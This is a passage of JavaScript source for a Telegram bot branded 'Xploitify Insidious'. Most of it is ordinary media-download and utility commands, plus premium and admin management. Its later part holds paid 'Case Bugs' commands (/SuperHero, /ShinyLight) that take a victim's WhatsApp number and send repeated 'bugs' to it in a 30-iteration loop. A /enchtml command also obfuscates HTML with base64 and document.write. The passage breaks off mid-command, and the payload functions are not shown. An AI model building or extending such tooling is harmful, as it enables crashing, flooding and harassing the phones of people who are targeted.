    await bot.sendMessage(msg.chat.id, "❌ ⵢ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti" + err);
  }
});

bot.onText(/^\/brat(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) return bot.sendMessage(chatId, "❌ ⵢ Masukkan teks!");

  try {
    const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(
      text
    )}&isVideo=false`;
    const res = await axios.get(apiURL, { responseType: "arraybuffer" });

    await bot.sendSticker(chatId, res.data, { filename: "sticker.webp" });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    bot.sendMessage(chatId, "❌ ⵢ Gagal membuat stiker brat.");
  }
});

const iqcSessions = {};
bot.onText(/^\/ssiphone(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  try {
    const args = msg.text.split(" ").slice(1);
    if (args.length < 3) {
      return bot.sendMessage(
        chatId,
        "❌ ⵢ Format : `/ssiphone 12:00 100 Your Message`",
        { parse_mode: "Markdown" }
      );
    }

    const time = args[0];
    const battery = args[1];
    const message = args.slice(2).join(" ");

    iqcSessions[chatId] = { time, battery, message };

    await bot.sendMessage(chatId, "Pilih Provider", {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Axis", callback_data: "iqc_provider_Axis" },
            { text: "Telkomsel", callback_data: "iqc_provider_Telkomsel" }
          ],
          [
            { text: "Indosat", callback_data: "iqc_provider_Indosat" },
            { text: "IM3", callback_data: "iqc_provider_IM3" }
          ]
        ]
      }
    });
  } catch (err) {
    console.error("Failed /iqc:", err.message);
    bot.sendMessage(chatId, "Terjadi kesalahan saat memproses IQC.");
  }
});

bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  try {
    if (!query.data.startsWith("iqc_provider_")) return;

    const provider = query.data.replace("iqc_provider_", "");
    const data = iqcSessions[chatId];

    if (!data) {
      return bot.sendMessage(chatId, "Data IQC tidak ditemukan. Jalankan command /iqc lagi.");
    }

    const { time, battery, message } = data;
    await bot.answerCallbackQuery(query.id, { text: "Diproses..." });
    await bot.sendMessage(chatId, "Sedang membuat gambar...");

    const apiUrl = `https://joocode.zone.id/api/iqc?t=${encodeURIComponent(
      time
    )}&b=${encodeURIComponent(battery)}&m=${encodeURIComponent(
      message
    )}&p=${encodeURIComponent(provider)}`;

    await bot.sendPhoto(chatId, apiUrl, {
      caption: "✅ ⵢ SsIphone By Dapz Exclusive ( 🕷️ )",
      parse_mode: "Markdown"
    });
  } catch (err) {
    console.error("ERROR callback_query:", err.message);
    bot.sendMessage(chatId, "Gagal generate IQC.");
  }
});

// ================== /reqlink @username (GROUP ONLY, ADMIN ONLY) ==================
const joinRuleByInvite = new Map(); // invite_link -> { chatId, target, createdBy, createdAt }

function normalizeUsername(u) {
  if (!u) return null;
  return String(u).replace(/^@/, "").trim().toLowerCase();
}

async function isGroupAdmin(chatId, userId) {
  try {
    const m = await bot.getChatMember(chatId, userId);
    return ["administrator", "creator"].includes(m.status);
  } catch {
    return false;
  }
}

bot.onText(/^\/reqlink\s+(@?\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // must be group / supergroup
  if (msg.chat.type !== "group" && msg.chat.type !== "supergroup") {
    return bot.sendMessage(chatId, "❌ Guna command ni dalam group.");
  }

  // admin only (or owner list)
  const ownerList = (config.OWNER_ID || []).map(String);
  const isOwner = ownerList.includes(String(userId));
  const admin = await isGroupAdmin(chatId, userId);

  if (!isOwner && !admin) {
    return bot.sendMessage(chatId, "❌ Only admin boleh guna /reqlink.");
  }

  const target = normalizeUsername(match[1]);
  if (!target) {
    return bot.sendMessage(chatId, "❌ Example: /reqlink @Boyzz444");
  }

  try {
    const expire = Math.floor(Date.now() / 1000) + 600; // 10 min

    // IMPORTANT: jangan letak member_limit bila creates_join_request true
    const invite = await bot.createChatInviteLink(chatId, {
      creates_join_request: true,
      expire_date: expire,
      name: `REQ-${target}-${Date.now()}`
    });

    joinRuleByInvite.set(invite.invite_link, {
      chatId,
      target,
      createdBy: String(userId),
      createdAt: Date.now()
    });

    const text =
      `🔐 <b>JOIN REQUEST LINK</b>\n\n` +
      `🎯 Target: @${target}\n` +
      `👤 Admin: @${msg.from.username || userId}\n` +
      `⏳ Expire: 10 min\n\n` +
      `<b>Link:</b>\n<code>${invite.invite_link}</code>\n\n` +
      `⚠️ Hanya @${target} akan di-approve. Yang lain auto reject.`;

    return bot.sendMessage(chatId, text, { parse_mode: "HTML" });

  } catch (err) {
    console.error("reqlink error:", err?.response?.body || err.message);
    return bot.sendMessage(
      chatId,
      "❌ Gagal buat link. Pastikan bot admin & ada izin Invite Users / Manage Chat."
    );
  }
});

// ================== AUTO APPROVE / REJECT JOIN REQUEST (BASED ON INVITE LINK) ==================
bot.on("chat_join_request", async (req) => {
  try {
    const inviteLink = req.invite_link?.invite_link;
    if (!inviteLink) return;

    const rule = joinRuleByInvite.get(inviteLink);
    if (!rule) return;

    const username = normalizeUsername(req.from.username);
    const mention = req.from.username ? `@${req.from.username}` : (req.from.first_name || "User");

    if (username && username === rule.target) {
      await bot.approveChatJoinRequest(req.chat.id, req.from.id).catch(() => {});
      await bot.revokeChatInviteLink(req.chat.id, inviteLink).catch(() => {});
      joinRuleByInvite.delete(inviteLink);

      // optional log
      // await bot.sendMessage(req.chat.id, `✅ ${mention} approved (target).`);
    } else {
      await bot.declineChatJoinRequest(req.chat.id, req.from.id).catch(() => {});
      // optional log
      // await bot.sendMessage(req.chat.id, `❌ ${mention} rejected (bukan target @${rule.target}).`);
    }
  } catch (e) {
    console.error("join_request handler error:", e?.response?.body || e.message);
  }
}); 

bot.onText(/^\/restart/, async (msg) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }
  await bot.sendMessage(chatId, "Succes Restart Bot");
  setTimeout(() => process.exit(0), 1000);
});

bot.onText(/^\/tiktokdl(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1]?.trim();

  if (!args)
    return bot.sendMessage(
      chatId,
      "❌ ⵢ Format: /tiktokdl https://example.com/"
    );

  let url = args;

  if (msg.entities) {
    for (const e of msg.entities) {
      if (e.type === "url") {
        url = msg.text.substring(e.offset, e.offset + e.length);
        break;
      }
    }
  }

  const wait = await bot.sendMessage(chatId, "Process Download Media Tiktok");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return bot.sendMessage(chatId, "❌ ⵢ Gagal ambil data video, pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = [];

      for (const img of imgs) {
        const res = await axios.get(img, { responseType: "arraybuffer" });
        media.push({
          type: "photo",
          media: { source: Buffer.from(res.data) }
        });
      }

      await bot.sendMediaGroup(chatId, media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl)
      return bot.sendMessage(chatId, "❌ ⵢ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await bot.sendVideo(
      chatId,
      Buffer.from(video.data),
      { supports_streaming: true },
      { filename: `${d.id || Date.now()}.mp4` }
    );
  } catch (e) {
    const errMsg = e?.response?.status
      ? `❌ ⵢ Error ${e.response.status} saat mengunduh video`
      : "❌ ⵢ Gagal mengunduh, koneksi lambat atau link salah";
    await bot.sendMessage(chatId, errMsg);
  } finally {
    try {
      await bot.deleteMessage(chatId, wait.message_id);
    } catch {}
  }
});

const sesi = {}

async function getTrack(query) {
  const url = `https://api.nekolabs.web.id/downloader/spotify/play/v1?q=${encodeURIComponent(query)}`
  const res = await axios.get(url)
  return res.data.result
}

bot.onText(/^\/play(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id
  const query = match[1]

  if (!query) {
    return bot.sendMessage(chatId, "❌ ⵢ Format: /play judul lagu")
  }

  sesi[chatId] = {
    musicList: [],
    index: 0
  }

  try {
    const result = await getTrack(query)
    sesi[chatId].musicList.push(result)
    sendMusicCard(chatId)
  } catch {
    bot.sendMessage(chatId, "❌ ⵢ Lagu tidak ditemukan.")
  }
})

bot.on("callback_query", async (cb) => {
  const chatId = cb.message.chat.id
  const action = cb.data

  const session = sesi[chatId]
  if (!session || session.musicList.length === 0) {
  return bot.answerCallbackQuery(cb.id, { text: "‎ " })
  }

  const d = session.musicList[session.index]

  if (action === "music_play") {
    await bot.answerCallbackQuery(cb.id)
    return bot.sendAudio(chatId, d.downloadUrl, {
      title: d.metadata.title,
      performer: d.metadata.artist
    })
  }

  if (action === "music_lyrics") {
    await bot.answerCallbackQuery(cb.id)
    try {
      const lyr = await axios.get(
        `https://api.deline.web.id/tools/lyrics?title=${encodeURIComponent(d.metadata.title)}`
      )
      return bot.sendMessage(
        chatId,
        lyr.data.result?.[0]?.plainLyrics || "❌ ⵢ Lirik tidak ditemukan."
      )
    } catch {
      return bot.sendMessage(chatId, "❌ ⵢ Error mengambil lirik.")
    }
  }
})

function sendMusicCard(chatId) {
  const session = sesi[chatId]
  const d = session.musicList[session.index]
  const meta = d.metadata

  const caption = `🎵 Song Name *${meta.title}*
👤 Artist : ${meta.artist}
⏱ Duration : ${meta.duration}
`

  bot.sendPhoto(chatId, meta.cover, {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🎧 Play", callback_data: "music_play" }],
        [{ text: "🔤 Lyrics", callback_data: "music_lyrics" }]
      ]
    }
  })
}

bot.onText(/^\/instagramdl(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id
  const q = match[1]

  if (!q) return bot.sendMessage(chatId, "❌ ⵢ Format: /instagramdl <url>")

  bot.sendMessage(chatId, "🕑 ⵢ Process Download media...")

  const api = `https://api.nekolabs.web.id/downloader/instagram?url=${encodeURIComponent(q)}`

  try {
    const r = await axios.get(api, { timeout: 15000 })
    if (!r.data || !r.data.success) return bot.sendMessage(chatId, "❌ ⵢ Gagal mengambil data")

    const list = r.data.result.downloadUrl

    if (!Array.isArray(list) || list.length === 0) return bot.sendMessage(chatId, "❌ ⵢ Media tidak ditemukan")

    for (const media of list) {
      if (media.endsWith(".mp4")) {
        await bot.sendVideo(chatId, media)
      } else {
        await bot.sendPhoto(chatId, media)
      }
    }

  } catch (e) {
    console.log("Err IG:", e.message)
    bot.sendMessage(chatId, "❌ ⵢ Terjadi kesalahan, coba lagi")
  }
})

bot.onText(/^\/facebookdl(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id
  const text = match[1]

  if (!text) return bot.sendMessage(chatId, "❌ ⵢ Format: /facebookdl <url>")

  const wait = await bot.sendMessage(chatId, "🕑 ⵢ Process Download Media...")

  try {
    const api = `https://api.nekolabs.web.id/downloader/facebook?url=${encodeURIComponent(text)}`
    const res = await axios.get(api)
    const result = res.data.result

    if (!result || !result.medias || result.medias.length === 0) {
      await bot.deleteMessage(chatId, wait.message_id)
      return bot.sendMessage(chatId, "❌ ⵢ Tidak ada media ditemukan.")
    }

    for (const m of result.medias) {
      if (m.type === "image") {
        await bot.sendPhoto(chatId, m.url)
      } else if (m.type === "video") {
        await bot.sendVideo(chatId, m.url)
      }
    }

    await bot.deleteMessage(chatId, wait.message_id)
  } catch (e) {
    try { await bot.deleteMessage(chatId, wait.message_id) } catch {}
    bot.sendMessage(chatId, "❌ ⵢ Terjadi kesalahan.")
  }
})

bot.onText(/^\/cekid$/i, async (msg) => {
  const chatId = msg.chat.id;
  const user = msg.from;
  const firstName = user.first_name || "";
  const lastName = user.last_name || "";
  const userId = user.id;
  try {
    const photos = await bot.getUserProfilePhotos(userId, { limit: 1 });
    const fileId = photos.photos[0][0].file_id;
    const text = `<b>User Info :</b>\n<b>USERNAME :</b> ${user.username ? '@' + user.username : 'Tidak ada'}\n<b>ID TELEGRAM:</b> <code>${userId}</code>`;
    bot.sendPhoto(chatId, fileId, {
      caption: text,
      parse_mode: "HTML",
      reply_to_message_id: msg.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: `${firstName} ${lastName}`, url: `tg://user?id=${userId}` }]
        ]
      }
    });
  } catch (e) {
    bot.sendMessage(chatId, `<b>ID :</b> <code>${userId}</code>`, { parse_mode: "HTML", reply_to_message_id: msg.message_id });
  }
});

bot.onText(/^\/pinterest(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = (match && match[1]) ? match[1].trim() : "";
  if (!query) return bot.sendMessage(chatId, "❌ ⵢ Format : /pinterest Butterfly");
  try {
    const apiUrl = `https://api.nvidiabotz.xyz/search/pinterest?q=${encodeURIComponent(query)}`;
    const res = await axios.get(apiUrl, { timeout: 15000 });
    const data = res.data;
    if (!data || !data.result || data.result.length === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ No Pinterest images found for your query.");
    }
    await bot.sendPhoto(chatId, data.result[0], { caption: `📌 Pinterest Result for: *${query}*`, parse_mode: "Markdown" });
  } catch (e) {
    bot.sendMessage(chatId, "❌ ⵢ Error fetching Pinterest image. Please try again later.");
  }
});


bot.onText(/^\/tofigure$/i, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;
  if (!reply || !reply.photo) return bot.sendMessage(chatId, "❌ ⵢ Format : Reply Image With Caption /tofigure.");
  await bot.sendMessage(chatId, "🕑 ⵢ Process Tofigure");
  try {
    const photo = reply.photo;
    const fileId = photo[photo.length - 1].file_id;
    const file = await bot.getFile(fileId);
    const telegramUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
    const apiUrl = `https://api.elrayyxml.web.id/api/ephoto/figure?url=${encodeURIComponent(telegramUrl)}`;
    const result = await axios.get(apiUrl, { responseType: "arraybuffer", timeout: 30000 });
    await bot.sendPhoto(chatId, Buffer.from(result.data), { caption: "✅ ⵢ Tofigure By Dapz Exclusive ( 🍁 )" });
  } catch (e) {
    bot.sendMessage(chatId, "❌ ⵢ Terjadi kesalahan." + (e.message || ""));
  }
});

bot.onText(/\/tourl/i, async (msg) => {
  const chatId = msg.chat.id;
  const repliedMsg = msg.reply_to_message;

  if (!repliedMsg || (!repliedMsg.document && !repliedMsg.photo && !repliedMsg.video)) {
    return bot.sendMessage(chatId, "❌ ⵢ Silakan reply sebuah file/foto/video dengan command /tourl");
  }

  let fileId, fileName;

  if (repliedMsg.document) {
    fileId = repliedMsg.document.file_id;
    fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
  } else if (repliedMsg.photo) {
    const photos = repliedMsg.photo;
    fileId = photos[photos.length - 1].file_id;
    fileName = `photo_${Date.now()}.jpg`;
  } else if (repliedMsg.video) {
    fileId = repliedMsg.video.file_id;
    fileName = `video_${Date.now()}.mp4`;
  }

  try {
    const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox..."); 

    const file = await bot.getFile(fileId);
    const fileLink = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: fileName,
      contentType: response.headers["content-type"] || "application/octet-stream",
    });

    const { data: catboxUrl } = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    if (!catboxUrl.startsWith("https://")) {
      throw new Error("Catbox tidak mengembalikan URL yang valid");
    }

    await bot.editMessageText(`✅ ⵢ Tourl By Dapz Exclusive ( 🕷️ )\n📎 URL: ${catboxUrl}`, {
      chat_id: chatId,
      message_id: processingMsg.message_id,
    });

  } catch (error) {
    console.error("Upload error:", error?.response?.data || error.message);
    bot.sendMessage(chatId, "❌ ⵢ Gagal mengupload file ke Catbox");
  }
});

bot.onText(/\/getcode (.+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const userId = msg.from.id;
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }
  
  const url = (match[1] || "").trim();
  if (!/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "❌ ⵢ Format :  /getcode https://namaweb");
  }

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000
    });
    const htmlContent = response.data;

    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await bot.sendDocument(chatId, filePath, {
      caption: `✅ ⵢ Get Code By Dapz Exclusive ( 🕷️ ) ${url}`
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "Error" + err);
  }
});

bot.onText(/\/enchtml(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from?.id;

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId, "❌ ⵢ Please Reply File .html");
  }

  try {
    const fileId = msg.reply_to_message.document.file_id;
    const fileInfo = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.file_path}`;

    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const htmlContent = global.Buffer.from(response.data).toString("utf8");

    const encoded = global.Buffer.from(htmlContent, "utf8").toString("base64");
    const encryptedHTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>dàpz. hólo</title>
<script>
(function(){
  try { document.write(atob("${encoded}")); }
  catch(e){ console.error(e); }
})();
</script>
</head>
<body></body>
</html>`;

    const outputPath = path.join(__dirname, "encrypted.html");
    fs.writeFileSync(outputPath, encryptedHTML, "utf-8");

    await bot.sendDocument(chatId, outputPath, {
      caption: "✅ ⵢ Enc Html By Dapz Exclusive ( 🕷️ )"
    });

    fs.unlinkSync(outputPath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ ⵢ Error Saat Membuat Sticker");
  }
});

// Acces !!
bot.onText(/\/setcd (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ ⵢ Missing input. Please provide a user ID and duration. Example: /addprem ID 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ ⵢ Missing input. Please specify a duration. Example: /addprem ID 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ ⵢ Missing input. User ID must be a number. Example: /addprem ID 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ ⵢ Missing duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${senderId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ ⵢ User ${senderId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ ⵢ User ${senderId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "❌ ⵢ No premium users found.");
  }

  let message = "<blockquote><b>¡ ᬊ Xploitify ༑ᐧ Insidious ¡</b></blockquote>\nList - Premium\n\n";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "HTML" });
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

  if (!isOwner(senderId)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ ⵢ Format : /addadmin ID.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ ⵢ Format : /addadmin ID.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${senderId} To Admin`);
        bot.sendMessage(chatId, `✅ ⵢ User ${senderId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ ⵢ User ${senderId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
        return bot.sendMessage(chatId, "❌ ⵢ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ ⵢ Please provide a user ID. Example: /delprem id");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ ⵢ Missing input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ ⵢ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ ⵢ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ ⵢ Format : /deladmin id.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ ⵢ Format : /deladmin id.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ ⵢ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ ⵢ User ${userId} is not an admin.`);
    }
});

// ~ Case Bugs 1
bot.onText(/\/SuperHero (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  const mention = Jid;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, `
<b>Premium Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ SuperHero
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, { parse_mode: "HTML" });

    for (let i = 0; i < 30; i++) {
      await btnStatus(target, mention);
      await sleep(1000);
      await gsIntjav(sock, target, otaxkiw = true);
      await sleep(1000);
      console.log(chalk.red.bold(`Xploitify Insidious Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(`
<blockquote><b>𖣂 ¡ #- Xploitify° ─( 🦠 )</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ SuperHero
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>© ⚊ dàpz. hólo - ¿?</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 2
bot.onText(/\/ShinyLight (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  const mention = Jid;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, `
<b>Premium Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `
